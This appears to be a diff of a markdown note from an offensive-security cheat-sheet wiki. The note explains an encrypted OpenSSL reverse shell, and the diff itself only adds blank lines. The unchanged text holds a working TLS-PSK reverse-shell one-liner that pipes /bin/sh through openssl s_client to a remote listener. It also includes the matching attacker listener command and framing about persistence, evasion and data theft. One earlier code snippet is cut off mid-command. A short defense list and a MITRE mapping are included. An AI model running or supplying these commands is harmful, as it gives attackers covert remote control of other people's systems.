@@ -37,6 +37,8 @@ Technical Explanation: This technique relies on OpenSSL, an open-source implemen
 
 Business Value: This technique can be used by attackers to maintain persistent access to a compromised host, allowing them to continue to exfiltrate sensitive data and execute commands on the target system. By using encryption and a non-standard port, the attacker can evade detection by security monitoring tools, making it more difficult for defenders to detect and respond to the attack.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised host
@@ -45,6 +47,8 @@ Business Value: This technique can be used by attackers to maintain persistent a
 
 1. Ability to create a listener on the attacker's system
 
+ 
+
 ## Defense
 
 1. Monitor network traffic for unusual SSL/TLS connections and non-standard ports
@@ -52,6 +56,8 @@ Business Value: This technique can be used by attackers to maintain persistent a
 1. Implement SSL/TLS inspection to detect and block malicious connections
 
 1. Use endpoint detection and response tools to detect and respond to malicious activity on the target host
+
+ 
 
 ## Objectives
 
@@ -63,11 +69,19 @@ Business Value: This technique can be used by attackers to maintain persistent a
 
 1. Exfiltrate sensitive data from the target system
 
+ 
+
 # Instructions
 
 1. To establish a reverse shell, the attacker generates a self-signed certificate and starts an SSL/TLS server on their machine using the certificate. The victim is then tricked into connecting to the SSL/TLS server and a shell is spawned on the attacker's machine. The victim's shell is redirected to the SSL/TLS server using OpenSSL s_client command.
 
+ 
+
+
+
 **Code**: [[user@attack$ openssl req -x509 -newkey rsa:4096 -k]]
+
+
 
 > - openssl req: This command generates a self-signed certificate.
 - -x509: This option specifies that a self-signed certificate is to be generated.
@@ -97,10 +111,18 @@ Business Value: This technique can be used by attackers to maintain persistent a
 
 2. To use this command, first generate a 384-bit PSK by running the command "openssl rand -hex 48". Then, replace the value of the two PSK variables ("PSK=replacewithgeneratedpskfromabove") with the generated PSK. Next, run the server command on the attacker machine and the client command on the victim machine. This will create a secure TLS-PSK connection between the two machines.
 
+ 
+
+
+
 **Code**: [[# generate 384-bit PSK
 # use the generated string ]]
 
+
+
 > TLS-PSK is a secure method of communication that does not rely on PKI or self-signed certificates. Instead, it uses a pre-shared key (PSK) that is known to both the client and server. This command generates a PSK and provides instructions for setting up a TLS-PSK connection between an attacker and victim machine. The server command sets up the TLS-PSK listener on the attacker machine, while the client command connects to the listener on the victim machine. Once the connection is established, the attacker can execute commands on the victim machine.
+
+
 
 **Command** ([[Generate 384-bit PSK]]):
 
@@ -108,17 +130,27 @@ Business Value: This technique can be used by attackers to maintain persistent a
 openssl rand -hex 48
 ```
 
+
+
+
+
 **Command** ([[Start OpenSSL server with PSK]]):
 
 ```bash
 export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
 ```
 
+
+
+
+
 **Command** ([[Start OpenSSL client with PSK]]):
 
 ```bash
 export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -142,3 +174,5 @@ export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedps
 - [[OpenSSL]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
